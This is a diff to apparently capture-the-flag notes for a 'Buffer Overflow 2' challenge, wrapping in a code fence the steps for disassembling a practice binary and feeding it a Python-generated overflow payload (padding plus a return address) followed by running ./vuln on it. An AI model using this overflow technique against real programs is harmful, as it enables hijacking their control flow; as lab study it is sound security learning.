@@ -24,6 +24,7 @@ Buffer Overflow 2- Sometimes, just overflowing the function isn't enough. We nee
 
 Steps -
 
+```py
 1. Info func
 2. disassemble main, vuln, flag etc
 3. run the program and overflow it
@@ -35,6 +36,7 @@ Steps -
 9. So python3 'print ("A" * 44 +  "\xf6\x91\x49\x80")' > payload
 10. echo "fake_flag" > flag.txt
 11. ./vuln < payload
-12. If it doesn't work try with the very next address from 
+12. If it doesn't work try with the very next address from '
+```
 
 ---
